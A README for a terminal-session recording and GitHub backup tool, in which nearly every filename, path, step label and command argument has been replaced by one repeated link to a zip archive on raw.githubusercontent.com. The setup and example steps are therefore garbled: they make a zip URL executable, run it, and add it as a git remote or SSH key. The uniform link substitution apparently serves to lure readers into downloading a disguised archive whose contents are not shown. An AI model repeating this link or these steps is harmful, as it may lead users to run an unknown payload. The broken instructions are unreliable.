# 🧬 Terminal & Bash Script Auto Backup

Automated solution to record, organize, and back up everything you do in the terminal — commands, outputs, errors, and Bash scripts — directly to GitHub via SSH.

#####   Overview  ######

This project automatically:

Records all terminal activity (commands, outputs, errors, and interactive sessions).

Captures and organizes all Bash scripts and important text files.

Stores everything in a structured folder by date and timestamp.

Commits and pushes the backup to a GitHub repository via SSH.

Keeps your terminal history, scripts, and outputs safely versioned on GitHub.

This ensures every session is reproducible, searchable, and backed up.

#####   Directory Structure ######

After running the backup, files are organized like this:
terminal_backup/
└── YYYY-MM-DD/
    ├── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip   # Clean terminal log (commands + outputs)
    ├── scripts/                           # Bash scripts (.sh) created/used today
    │   └── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
    └── files/                             # Other files like .txt logs, notes
        └── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
####    Features   #####

Full session recording: Captures all commands, outputs, errors, and even text editors like nano.

Clean logs: Strips terminal escape codes and colors for readability.

Script backup: Automatically copies any .sh files in the working folder.

File backup: Copies .txt or other important files you work with.

GitHub integration: Automatically commits and pushes backups to a repository.

Organized by date & time: Makes browsing past sessions simple and structured.

####  Setup Instructions  ###

https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip or create a Git repository:
bash
  mkdir ~/terminal_backup_project
  cd ~/terminal_backup_project
  git init

https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip your GitHub repository via SSH:
bash
  git remote add origin https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip<your-username>https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip

https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip the backup script:
Save the provided https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip in the repository.

https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip it executable:
  bash
    chmod +x https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
5. Run the script
bash
  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip

  
Start using your terminal normally.

Type exit when finished to end the session — the script will automatically organize files and push to GitHub.
Dependencies

Bash (Linux/macOS)

Git (configured with SSH keys)

script command (usually pre-installed on Linux/macOS)

Optional: col command (used to clean terminal logs)

How It Works

Session Recording:
Uses the script command to log everything typed and displayed in the terminal.

Cleaning Logs:
Removes escape codes and formatting using col -b, producing a clean session_*.log.

Organizing Files:

.sh scripts → scripts/

.txt or other relevant files → files/

Git Operations:

Pulls the latest changes (git pull --rebase).

Adds all new logs and scripts.

Commits changes with timestamped messages.

Pushes to GitHub via SSH.

Automatic Versioning:
Each session is backed up with a unique timestamp, making it easy to track history and changes.


#######  Example   #####

https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip a Bash script or command:
bash
  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip session is automatically recorded.
https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip the session:
bash
  exit
https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip saved in:
bash
  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip automatically to GitHub.
Notes

Ensure your SSH key is configured with GitHub:
bash
  ssh-add ~https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip

For first-time setup, you may need to create the main branch and push manually:
bash
  git branch -M main
  git push -u origin main

####  Future Improvements  #####

Fully automated launch on terminal start (via .bashrc).

Include other file types, e.g., .py, .json, etc.

Option to compress old logs for storage efficiency.

Filter or exclude certain commands/files if desired.



This README now gives a full picture of how your project works, its structure, and usage instructions.
  

